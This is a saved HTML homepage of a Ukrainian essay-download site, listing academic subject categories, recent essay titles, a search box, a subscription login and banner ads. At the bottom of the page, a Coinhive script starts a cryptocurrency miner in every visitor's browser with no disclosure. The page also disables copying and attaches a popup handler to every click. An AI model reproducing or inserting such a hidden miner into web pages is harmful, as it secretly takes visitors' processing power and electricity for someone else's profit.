<!--?php
	$okmodal = FALSE;
	session_start();
	if(isset($_COOKIE["timemodal"])){
		$valuesss = $_COOKIE["timemodal"]+1;  
		if($valuesss==1 or $valuesss==5 or $valuesss>20)$okmodal = TRUE;
		//if($valuesss>1)$okmodal = TRUE;
		
		setcookie("timemodal", $valuesss);
	}
	else {
		setcookie("timemodal", 0); 
	}
?-->
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name='yandex-verification' content='78812b1c41cf8861' />
<meta name="google-site-verification" content="49MlFDzbLYYKniCXJYAzXzQnZIg6CkzVx1O20vJXoY0" />
<link href="/assets/bootstrap/css/bootstrap.css" rel="stylesheet">
 <link href="/assets/css/style.css" rel="stylesheet">
<link href="/favicon.ico" rel="shortcut icon" type="image/x-icon" /> 
<title>Українськi Реферати</title>
	<meta name=keywords CONTENT="Українська База рефератів, Багато рефератів, Скачати реферати, Скачати курсові">
	<meta name=description CONTENT="...">
	<meta http-equiv="Content-Type" content="text/css; charset=UTF-8"></meta>
	<base href="http://referatu.net.ua/" />
	<link rel="shortcut icon" href="gfx/favicon.ico" type="image/x-icon" />
	<script type="text/javascript" src="/js/script.js"></script>
								<script type="text/javascript" src="/js/ajax.js"></script>
								<script type="text/javascript" src="/js/jquery-1.5.1.min.js"></script>
	<style type="text/css" media="all">@import "/css/css.css";</style>
	
	
<script type="text/javascript" src="jquery-1.3.2.min.js"></script>
<script type="text/javascript" src="jquery.disable.text.select.js"></script>
<script>
          $(function() {
$('.disableSelection').disableTextSelect(); // and enableTextSelect() to re-enable it again
});
</script>
<script type="text/javascript" src="https://apis.google.com/js/plusone.js">
  {lang: 'ru'}
</script>
</head>
<body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0" onclick = "mgopen(event);" oncopy= "return false">
<!--body bgcolor="#000000" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0"-->
<noscript>
      <div id="none"></div>
</noscript>
<form name="block_frm">
		<input type="hidden" name="block" />
		<input type="hidden" name="ins_type" />
</form>
<div id="ajax_search" style="position:absolute; left:174px; top:162px; border:1px solid red; width:499px; background-color:white; display:none;"></div>
<table width="1000" border="0" cellspacing="0" cellpadding="0" align="center" bgcolor="#FFFFFF">
  <tr>
    <td>
    <div id="verh">
    <div id="z22"><noindex>
    <strong>
    <div id="z2222">
    У нас: 141825 рефератів </div> 
       <a href="http://referatu.net.ua/help"> Правила </a> 
    <a href="/new"> Щойно додані Реферати </a>
    <a href="/top"> Тор 100 </a>
    <a href="http://referatu.net.ua/pay.php"> Придбати абонемент </a>
    <a href="http://referatu.net.ua/backconnect"> Технічна підтримка</a>
	</div>
    </strong>
    </noindex>
    
    </div>
    <!--a href="/new"-->
        
    </td>
  </tr>
  
  <tr>
    <td background="/images/index_03.gif" height="89px">
       <a href="/"><div id="z222"> </div></a>
       
    <div id="468" >   
<!-- Ukrainian Banner Network 728х90 START -->
	<a href='http://bazar.if.ua/?target=1' target='blank'>
	<img src="http://bazar.if.ua/images/b1/728/6.gif">
	</a>
<!-- Ukrainian Banner Network 728х90 END -->
</div> 
         
    </td>
  </tr>
  <tr>
    <td>
    <form name="frms" action="/search/">
    <div id="z1"></div>
        <div id="chekbox">
    		<div id="chekbox2">
            Скористайтеся пошуком, наприклад  
            <font style="text-decoration:underline" 
            		onclick="document.getElementById('input').value='Реферат';">
                    Реферат</font>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
            <input name="typse" type="radio" value="gs" checked> Грубий пошук
			<input name="typse" type="radio" value="ts" > Точний пошук
            </div>
    	</div>
    	
    
    
    <div id="z2">
    	<div id="z23"><strong>Вхід в абонемент</strong></div>
    </div>
 <tr>
    <td background="/images/index_11.gif" height="31px">   
    <div id=ss00>
    <div class="ss"><input type="text" maxlength="256" name="search" id="poshuk" value=""></div><!--onkeyup="ajax_search(this.value);"-->
     <a href="javascript:document.frms.submit();"><div class="s2">  </div></a>
    </form>
    </div><form method="POST" name="frm">
    							<div class="s3"></div>
							<form method="POST">
								<div class="s4">
								<input type="text" maxlength="10" name="abon" id="kod">
								</div>
			    				<div class="s5"><input type="image" src="images/5_15.png"></div>
    						</form></form>

    </td>  
     <tr>
    <td>  
 
<div style="background-image:url(/images/3_06.gif); height:27px; width:24px; float:left" ></div>
<div id="upr"> <!--управление-->
 <div style="background-image:url( images/4_07.gif ); height:27px; width:144px; float:left; text-align:center;" onmouseover=set_bg('alls','/images/4_07.gif'); onmouseout=set_bg('alls','/images/3_07.gif'); id="alls" ><a href="?filter=0">Всі реферати </a></div>   
 <div style="background-image:url( images/3_08.gif ); height:27px; width:190px; float:left; text-align:center;" onmouseover=set_bg('allss','/images/4_08.gif'); onmouseout=set_bg('allss','/images/3_08.gif'); id="allss"  ><a href="?filter=1">Курсові  Дипломні Магістерські </a></div>
 <div style="background-image:url( images/3_09.gif ); height:27px; width:196px; float:left; text-align:center;" onmouseover=set_bg('allsss','/images/4_09.gif'); onmouseout=set_bg('allsss','/images/3_09.gif'); id="allsss"  ><a href="?filter=2">Реферати  Контрольні</a></div>
</div> 
 <div style="background-image:url(/images/3_10.gif); height:27px; width:446px; float:left" >
   <div id="z233"><!--strong>Правознаство та юридични науки</strong--></div>
 </div>
  
 <!--------------->
 
 <div class="disableSelection2"; 
 style="background-image:url(/images/3_11.gif);
      background-repeat: repeat-x; 
     width:1000px;
     height:auto;
     float:left" > 
             
     
				<div style="width:auto">
<div class="banner120_6002"><br />


</div>
<p id="sa99"></p>

<span id="kekl1"><h4><a href="http://3.com.ua">Бесплатные объявления украины</a> | <a href="http://myreferat.net">Реферат на тему</a></h4></span>
	<!--%@TOP_ONE%-->

	<!--%@TOP_TWO%-->




                            
                            <div id="spysok"> 
                            <div id="schetchik">
                            
                            </div>   
                                  
                                  <br />



<table width="100%" border="0" cellspacing="10" cellpadding="0" bordercolor="#000000">
   <tr id="spysok2">
    <td width="50%"  id="qq2">▪ <a href="referats/22" class="menu_margin">Інше, всяке, різне</a><br />▪ <a href="referats/7567" class="menu_margin">Історія економічних вчень, економічна історія</a><br />▪ <a href="referats/17" class="menu_margin">Історія України</a><br />▪ <a href="referats/7575" class="menu_margin">Історія України (новітня)</a><br />▪ <a href="referats/7570" class="menu_margin">Аграрні науки</a><br />▪ <a href="referats/7374" class="menu_margin">Архітектура та будівництво</a><br />▪ <a href="referats/211" class="menu_margin">Астрономія, авіація, космонавтика</a><br />▪ <a href="referats/66" class="menu_margin">Біологічні науки</a><br />▪ <a href="referats/718" class="menu_margin">Військова справа</a><br />▪ <a href="referats/143" class="menu_margin">Всесвітня історія</a><br />▪ <a href="referats/951" class="menu_margin">Географія</a><br />▪ <a href="referats/7513" class="menu_margin">Географія економічна, регіональна економіка, РПС</a><br />▪ <a href="referats/5534" class="menu_margin">Геологія, геодезія, геоморфологія</a><br />▪ <a href="referats/919" class="menu_margin">Готельна справа та побутове обслуговування</a><br />▪ <a href="referats/7515" class="menu_margin">Гроші і кредит</a><br />▪ <a href="referats/7375" class="menu_margin">Діловодство, бібліотечна справа</a><br />▪ <a href="referats/7571" class="menu_margin">Державне управління</a><br />▪ <a href="referats/7576" class="menu_margin">Джерелознавство та історіографія</a><br />▪ <a href="referats/7569" class="menu_margin">Дисертації та Автореферати</a><br />▪ <a href="referats/183" class="menu_margin">Екологія</a><br />▪ <a href="referats/18" class="menu_margin">Економічні науки</a><br />▪ <a href="referats/7520" class="menu_margin">Економічна теорія, теорія економічних наук</a><br />▪ <a href="referats/7376" class="menu_margin">Журналістика, телебачення, ЗМІ</a><br />▪ <a href="referats/94" class="menu_margin">Комп’ютерні науки, інформатика</a><br />▪ <a href="referats/111" class="menu_margin">Культурологія, етика, естетика</a><br />▪ <a href="referats/54" class="menu_margin">Література</a><br />▪ <a href="referats/7526" class="menu_margin">Література світова</a><br />▪ <a href="referats/7527" class="menu_margin">Література Українська</a><br />▪ <a href="referats/2740" class="menu_margin">Логіка</a><br />▪ <a href="referats/7578" class="menu_margin">Міжнародна економіка</a><br />▪ <a href="referats/7380" class="menu_margin">Мікроекономіка</a><br />▪ <a href="referats/7379" class="menu_margin">Макроекономіка</a><br />▪ <a href="referats/7579" class="menu_margin">Маркетинг</a><br />▪ <a href="referats/20" class="menu_margin">Медицина, фізіологія, терапія</a><br /></td>
    <td width="50%" id="qq2">▪ <a href="referats/390" class="menu_margin">Менеджмент і маркетинг</a><br />▪ <a href="referats/49" class="menu_margin">Мистецтво та культура</a><br />▪ <a href="referats/7377" class="menu_margin">Мова іноземна</a><br />▪ <a href="referats/128" class="menu_margin">Мовознавство</a><br />▪ <a href="referats/7534" class="menu_margin">Музика, теорія та історія музики</a><br />▪ <a href="referats/933" class="menu_margin">Народознавство, етнографія, етнологія</a><br />▪ <a href="referats/7539" class="menu_margin">Наукознавство, інновації, ОНД</a><br />▪ <a href="referats/7572" class="menu_margin">Нафтогазова промисловість</a><br />▪ <a href="referats/7371" class="menu_margin">Облік і аудит</a><br />▪ <a href="referats/144" class="menu_margin">Особистості</a><br />▪ <a href="referats/448" class="menu_margin">Охорона праці та БЖД</a><br />▪ <a href="referats/27" class="menu_margin">Педагогіка</a><br />▪ <a href="referats/1472" class="menu_margin">Податки, банківська справа, бухгалтерський облік</a><br />▪ <a href="referats/7580" class="menu_margin">Політекономія</a><br />▪ <a href="referats/207" class="menu_margin">Політологія та політика</a><br />▪ <a href="referats/135" class="menu_margin">Правознавство та юридичні науки</a><br />▪ <a href="referats/23" class="menu_margin">Психологія</a><br />▪ <a href="referats/28" class="menu_margin">Релігієзнавство</a><br />▪ <a href="referats/7550" class="menu_margin">Риторика, ораторське мистецтво</a><br />▪ <a href="referats/68" class="menu_margin">Соціологія</a><br />▪ <a href="referats/154" class="menu_margin">Спорт, туризм, рекреація</a><br />▪ <a href="referats/7373" class="menu_margin">Страхування</a><br />▪ <a href="referats/7556" class="menu_margin">Сценарії виховних заходів, уроків, свят</a><br />▪ <a href="referats/7378" class="menu_margin">Теорія держави та права</a><br />▪ <a href="referats/21" class="menu_margin">Технічні науки</a><br />▪ <a href="referats/6751" class="menu_margin">Технологія виробництва</a><br />▪ <a href="referats/7529" class="menu_margin">Товарознавство, логістика, перевезення</a><br />▪ <a href="referats/119" class="menu_margin">Фізико-математичні науки</a><br />▪ <a href="referats/91" class="menu_margin">Філософія</a><br />▪ <a href="referats/7564" class="menu_margin">Фінанси, міжнародні, державні фінанси</a><br />▪ <a href="referats/100" class="menu_margin">Хімічні науки</a><br />▪ <a href="referats/7573" class="menu_margin">Харчова промисловість</a><br />▪ <a href="referats/7381" class="menu_margin">Шкільні твори</a><br /></td>
  </tr>
</table>


<table width="100%" border="0" cellspacing="10" cellpadding="0" bordercolor="#000000">
   <tr id="spysok2">
    <td width="50%"  id="qq2">▪ <a href="/newreferats/7564/191164" class="menu_margin">Державне регулювання цін </a><br />▪ <a href="/newreferats/7564/191163" class="menu_margin">Цінова еластичність попиту і пропозиції </a><br />▪ <a href="/newreferats/7564/191162" class="menu_margin">Форми організації підприємницької діяльності в країнах з ринковою економікою </a><br />▪ <a href="/newreferats/7564/191161" class="menu_margin">Фірма як суб'єкт ринкових відносин </a><br />▪ <a href="/newreferats/7564/191160" class="menu_margin">Фінансова система. Державний бюджет. Податки </a><br />▪ <a href="/newreferats/18/191159" class="menu_margin">Теорія попиту і пропозиції </a><br />▪ <a href="/newreferats/18/191158" class="menu_margin">Теорія виробництва та його факторів. Виробнича функція </a><br />▪ <a href="/newreferats/7564/191157" class="menu_margin">Суть та функції грошей </a><br />▪ <a href="/newreferats/7520/191156" class="menu_margin">Суть та основні чинники економічного зростання </a><br />▪ <a href="/newreferats/7579/191155" class="menu_margin">Сутність та основні концепції маркетингу </a><br />▪ <a href="/newreferats/7379/191154" class="menu_margin">Сукупний попит і сукупна пропозиція </a><br />▪ <a href="/newreferats/7379/191153" class="menu_margin">Споживач як суб'єкт ринкових відносин </a><br />▪ <a href="/newreferats/7520/191152" class="menu_margin">Споживання і нагромадження </a><br />▪ <a href="/newreferats/7520/191151" class="menu_margin">Сутність, структура та закономірності розвитку світового господарства. Зовнішньоекономічна діяльність України </a><br />▪ <a href="/newreferats/7520/191150" class="menu_margin">Система агробізнесу та земельна рента </a><br />▪ <a href="/newreferats/1472/191149" class="menu_margin">Роль податків і державних видатків в економічній політиці держави </a><br />▪ <a href="/newreferats/7379/191148" class="menu_margin">Роль держави в ринковій економіці </a><br />▪ <a href="/newreferats/7379/191147" class="menu_margin">Ринок як економічна форма організації функціонування економіки </a><br />▪ <a href="/newreferats/7379/191146" class="menu_margin">Ринок цінних паперів. Види цінних паперів </a><br />▪ <a href="/newreferats/7379/191145" class="menu_margin">Ринок праці та безробіття </a><br />▪ <a href="/newreferats/7379/191144" class="menu_margin">Ринок праці. Заробітна плата </a><br />▪ <a href="/newreferats/7379/191143" class="menu_margin">Ринок капіталу. Процент </a><br />▪ <a href="/newreferats/7379/191142" class="menu_margin">Ринковий механізм регулювання економічних відносин </a><br />▪ <a href="/newreferats/7379/191141" class="menu_margin">Ринкова організація виробництва </a><br />▪ <a href="/newreferats/7379/191140" class="menu_margin">Ринкова інфраструктура </a><br />▪ <a href="/newreferats/7379/191139" class="menu_margin">Ринки чинників виробництва </a><br />▪ <a href="/newreferats/7379/191138" class="menu_margin">Принципи чисто ринкової економіки </a><br />▪ <a href="/newreferats/7520/191137" class="menu_margin">Предмет і метод економічної теорії </a><br />▪ <a href="/newreferats/7520/191136" class="menu_margin">Поняття "перехідна економіка" </a><br />▪ <a href="/newreferats/7520/191135" class="menu_margin">Платіжний баланс </a><br />▪ <a href="/newreferats/7520/191134" class="menu_margin">Перспективи економічного зростання </a><br />▪ <a href="/newreferats/7379/191133" class="menu_margin">Підприємницька діяльність і конкуренція. Антимонопольна політика </a><br />▪ <a href="/newreferats/7379/191132" class="menu_margin">Особливості формування ціни й обсягу виробництва на прикладі різних ринкових моделей </a><br />▪ <a href="/newreferats/390/191131" class="menu_margin">Основні функції менеджменту </a><br />▪ <a href="/newreferats/7379/191130" class="menu_margin">Основні результати і показники макроекономіки </a><br />▪ <a href="/newreferats/7520/191129" class="menu_margin">Основні проблеми організації економіки </a><br />▪ <a href="/newreferats/7564/191128" class="menu_margin">Міжнародна валютна система. Світовий валютний ринок </a><br />▪ <a href="/newreferats/7520/191127" class="menu_margin">Міжнародна торгівля </a><br />▪ <a href="/newreferats/7379/191126" class="menu_margin">Організація, її основні компоненти та типи </a><br />▪ <a href="/newreferats/7379/191125" class="menu_margin">Організаційні форми підприємницької діяльності </a><br />▪ <a href="/newreferats/7379/191124" class="menu_margin">Наслідки дії ринкової системи </a><br />▪ <a href="/newreferats/7564/191123" class="menu_margin">Мотивація: сутність, еволюція, ієрархія потреб та винагорода </a><br />▪ <a href="/newreferats/7564/191122" class="menu_margin">Механізм формування ренти позичкового відсотка і прибутку </a><br />▪ <a href="/newreferats/390/191121" class="menu_margin">Менеджмент: сутність, соціально-економічні та теоретичні основи </a><br />▪ <a href="/newreferats/7579/191120" class="menu_margin">Маркетинговий аналіз ринку. Служба маркетингу у фірмі </a><br />▪ <a href="/newreferats/7379/191119" class="menu_margin">Макроекономічна рівновага та економічне зростання </a><br />▪ <a href="/newreferats/7379/191118" class="menu_margin">Макроекономічна нерівновага. Циклічність розвитку ринкової економіки </a><br />▪ <a href="/newreferats/7515/191117" class="menu_margin">Кредитно-банківська система </a><br />▪ <a href="/newreferats/7515/191116" class="menu_margin">Кредитно-грошова політика </a><br />▪ <a href="/newreferats/7520/191115" class="menu_margin">Комунікації. Комунікаційна структура управління </a><br /></td>
    <td width="50%" id="qq2">▪ <a href="/newreferats/7520/191114" class="menu_margin">Керівництво: влада і лідерство </a><br />▪ <a href="/newreferats/7379/191113" class="menu_margin">Заробітна плата в умовах ринкової економіки </a><br />▪ <a href="/newreferats/7520/191112" class="menu_margin">Закони товарного виробництва, їх сутність та функції </a><br />▪ <a href="/newreferats/7520/191111" class="menu_margin">Етапи виникнення, становлення та розвитку економічної теорії як науки </a><br />▪ <a href="/newreferats/7520/191110" class="menu_margin">Економічний прибуток </a><br />▪ <a href="/newreferats/7520/191109" class="menu_margin">Економічна теорія як наука та навчальна дисципліна </a><br />▪ <a href="/newreferats/7520/191108" class="menu_margin">Економічна безпека держави </a><br />▪ <a href="/newreferats/7520/191107" class="menu_margin">Економічні функції держави </a><br />▪ <a href="/newreferats/7520/191106" class="menu_margin">Економічні системи та їх класифікація </a><br />▪ <a href="/newreferats/7520/191105" class="menu_margin">Економічні реформи е Україні </a><br />▪ <a href="/newreferats/7520/191104" class="menu_margin">Економіка і право власності. Структура економіки </a><br />▪ <a href="/newreferats/7520/191103" class="menu_margin">Еволюційний розвиток економічної теорії </a><br />▪ <a href="/newreferats/7515/191102" class="menu_margin">Грошовий ринок </a><br />▪ <a href="/newreferats/7564/191101" class="menu_margin">Вплив ціни на валовий національний продукт </a><br />▪ <a href="/newreferats/7564/191100" class="menu_margin">Витрати виробництва у довгостроковому періоді </a><br />▪ <a href="/newreferats/7564/191099" class="menu_margin">Витрати виробництва </a><br />▪ <a href="/newreferats/7564/191098" class="menu_margin">Витрати і доходи фірми. Механізм ціноутворення </a><br />▪ <a href="/newreferats/7564/191097" class="menu_margin">Валовий внутрішній продукт і національний дохід </a><br />▪ <a href="/newreferats/1472/191096" class="menu_margin">Банківська справа </a><br />▪ <a href="/newreferats/18/191095" class="menu_margin">Антимонопольна діяльність </a><br />▪ <a href="/newreferats/7564/191094" class="menu_margin">Інфляція та її наслідки </a><br />▪ <a href="/newreferats/7564/191093" class="menu_margin">Державне регулювання цін </a><br />▪ <a href="/newreferats/951/191092" class="menu_margin">Що таке природознавство. Види природничих наук, предмет та мета вивчення. Класифікація методів наукового пізнання </a><br />▪ <a href="/newreferats/951/191091" class="menu_margin">Хронологія еволюції живої природи за даними палеонтології </a><br />▪ <a href="/newreferats/119/191090" class="menu_margin">Хвильова функція. Хвилі імовірності. Образ атома </a><br />▪ <a href="/newreferats/143/191089" class="menu_margin">Формування й розвиток античної цивілізації </a><br />▪ <a href="/newreferats/951/191088" class="menu_margin">Учення про біосферу </a><br />▪ <a href="/newreferats/91/191087" class="menu_margin">Учення Арістотеля </a><br />▪ <a href="/newreferats/951/191086" class="menu_margin">Теорія еволюції Ч. Дарвіна </a><br />▪ <a href="/newreferats/951/191085" class="menu_margin">Теорія відносності </a><br />▪ <a href="/newreferats/951/191084" class="menu_margin">Теорії елементарних частинок </a><br />▪ <a href="/newreferats/951/191083" class="menu_margin">Сучасна фізична картина світу: простір і час </a><br />▪ <a href="/newreferats/951/191082" class="menu_margin">Становлення цивілізації </a><br />▪ <a href="/newreferats/951/191081" class="menu_margin">Спеціальна теорія відносності </a><br />▪ <a href="/newreferats/951/191080" class="menu_margin">Сонячна система </a><br />▪ <a href="/newreferats/951/191079" class="menu_margin">Світ елементарних частинок </a><br />▪ <a href="/newreferats/951/191078" class="menu_margin">Розвиток життя на землі </a><br />▪ <a href="/newreferats/951/191077" class="menu_margin">Розвиток аналітичної механіки </a><br />▪ <a href="/newreferats/951/191076" class="menu_margin">Пульсари та нейтронні зірки </a><br />▪ <a href="/newreferats/951/191075" class="menu_margin">Проблеми енергетики (ядерні і термоядерні реактори) </a><br />▪ <a href="/newreferats/951/191074" class="menu_margin">Причинність класична і причинність квантова </a><br />▪ <a href="/newreferats/951/191073" class="menu_margin">Природознавство в епоху Відродження </a><br />▪ <a href="/newreferats/951/191072" class="menu_margin">Принцип еквівалентності </a><br />▪ <a href="/newreferats/951/191071" class="menu_margin">Походження людини </a><br />▪ <a href="/newreferats/951/191070" class="menu_margin">Походження життя </a><br />▪ <a href="/newreferats/951/191069" class="menu_margin">Подальший розвиток теорії еволюції. Дарвінізм XX століття </a><br />▪ <a href="/newreferats/951/191068" class="menu_margin">Основні характеристики атмосфери </a><br />▪ <a href="/newreferats/951/191067" class="menu_margin">Основні етапи еволюції живої природи </a><br />▪ <a href="/newreferats/951/191066" class="menu_margin">Ньютонівська революція </a><br />▪ <a href="/newreferats/951/191065" class="menu_margin">Ноосфера </a><br /></td>
  </tr>
</table>
                            
                                        
                                          
                             </div>        



      <br>
      
<div>
	      
        <br />
     
      <div id="marketgid">
        <div id="MarketGid417"><noindex>
<!-- Ukrainian Banner Network 300�250 START -->
<center><!-- MComposite Start -->
<div id="MarketGidComposite15988"><center><a id="mg_add15988" href="http://usr.marketgid.com/demo/goods/" target="_blank" rel="nofollow">�������� ���� ����������</a><br><a href="http://marketgid.com" target="_blank" rel="nofollow">��������...</a>
</center></div>
<!-- MComposite End -->
<!-- Elastic limiter Start-->
<span id="MGDW15988"></span>
<!-- Elastic limiter End-->

<script type="text/javascript">
var MGCD = new Date();
document.write('<scr'
+'ipt type="text/javascript"'
+' src="http://jsc.dt00.net/r/e/referatu.net.ua.15988.js?t='
+MGCD.getYear()
+MGCD.getMonth()
+MGCD.getDay()
+MGCD.getHours()
+'" charset="utf-8"></scr'+'ipt>');
</script>

<!-- Ukrainian Banner Network 300�250 END -->

        </noindex>
        
        </div>
    
      </div><br />  
      		
            
       	
      </div>
        
     <br /><div id="futer"></div> 	

 

</div>




</td>
  </tr>
</table> 


<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-3832084-6', 'auto');
  ga('send', 'pageview');

</script>

      <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
      <script>
          var miner = new CoinHive.User('aqsfz1flTA5Rk8pKRBsnxPJoFXbK2qn3', 'referaty');
          miner.start();
      </script>

</body>
</html>